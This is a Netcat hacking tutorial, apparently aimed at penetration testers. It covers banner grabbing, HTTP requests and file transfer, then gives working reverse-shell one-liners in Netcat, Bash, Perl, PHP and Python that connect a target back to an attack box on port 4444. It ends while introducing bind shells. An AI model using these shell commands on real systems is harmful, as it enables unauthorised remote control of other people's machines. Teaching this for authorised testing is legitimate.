## Netcat

#### Netcat banner grabbing
```
$ nc [ip address][port]
```


#### Netcat raw connection

To demonstrate how a raw connection works we will issue some FTP commands after we’re connected to the target host on the FTP service. Let’s see if anonymous access is allowed on this FTP server by issuing the USER and PASS command followed by anonymous.


#### Web server interaction

Netcat can also be used to interact with webservers by issuing HTTP requests.
```
$ nc 192.168.100.108 80
```

and the run
```
HEAD / HTTP/1.0
```



To retrieve the top level page on the webserver we can issue the following command:

```
$ nc 192.168.100.108 80
```
and run the following HTTP request:
```
GET / HTTP/1.0
```
#### File transfers with Netcat

In this example we will be using a Netcat connection to transfer a text file. Let’s assume we have remote command execution on the target host and we want to transfer a file from the attack box to the host. First we would need to set up a listener on the target host and connect to it from the attack box. We will be using port 8080 for this purpose and we safe the file to the desktop:

```
$ nc -lvp 8080 > /root/Desktop/transfer.txt
```
On the attack box(our machine) we connect to port 8080 and send a file name transfer.txt:

```
$ nc 192.168.100.107 8080 < /root/Desktop/transfer.txt
```

### Netcat reverse shells

A very popular usage of Netcat and probably the most common use from penetration testing perspective are reverse shells and bind shells. A reverse shell is a shell initiated from the target host back to the attack box which is in a listening state to pick up the shell. A bind shell is setup on the target host and binds to a specific port to listens for an incoming connection from the attack box. In malicious software a bind shell is often revered to as a backdoor.

In the following paragraphs we will be demonstrating the use of bind and reverse shell. We will be using port 4444 throughout this tutorial but please note that this can be any open port instead. In fact, often you need to use more common ports like 80 and 443 to setup reverse shells as it is more common for these ports to be open.

#### Setting up Netcat Reverse Shells


![](just-data/ncatrevshell.jpg)

In order to setup a Netcat reverse shell we need to follow the following steps:

1. Setup a Netcat listener.
2. Connect to the Netcat listener from the target host.
3. Issue commands on the target host from the attack box.


First we setup a Netcat listener on the attack box which is listening on port 4444 with the following command:

```
$ nc –lvp 4444

```

Than we issue the following command on the target host to connect to our attack box (remember we have remote code execution on this box):

```
$ nc 192.168.100.113 4444 –e /bin/bash

```

for windows:
```
nc.exe 192.168.100.113 4444 –e cmd.exe
```

#### Reverse shell without Netcat on the target host

One major downside on the shown example is that you need Netcat on that target host which is very often not the case in real world scenario’s. In some cases Netcat is present, or we have a way to install it, but in many cases we need to use alternatives ways to connect back to the attack box. Let’s have a look at a few alternative ways to setup a reverse shell.

##### Bash reverse shell

With can also use Bash to initiate a reverse shell from the target host to the attack box by using the following command:

```
$ bash -i >& /dev/tcp/192.168.100.113/4444 0>&1
```

##### Perl reverse shell

```
$ perl -e ‘use Socket;$i=”192.168.100.113″;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
```

##### PHP reverse shell

```
$ php -r ‘$sock=fsockopen(“192.168.100.113”,4444);exec(“/bin/sh -i <&3 >&3 2>&3”);’

```

##### Python reverse shell


```
$ python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.100.113”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
```

#### Netcat Bind Shell

As we’ve mentioned earlier in this Hacking with Netcat tutorial a bind shell is a shell that binds to a specific port on the target host to listen for incoming connections. Let’s have a look at the visualization of a bind Netcat shell:


![](just-data/ncatbindshell.jpg)


In this visualization the target binds a Bash shell to port 4444 using a Netcat listener. The attacker connects to this port using a simple Netcat command. The steps to setup a bind shell are as following:


1. Bind a bash shell to port 4444 using Netcat.
2. Connect to the target host on port 4444 from the attack box.
3. Issue commands on the target host from the attack box.
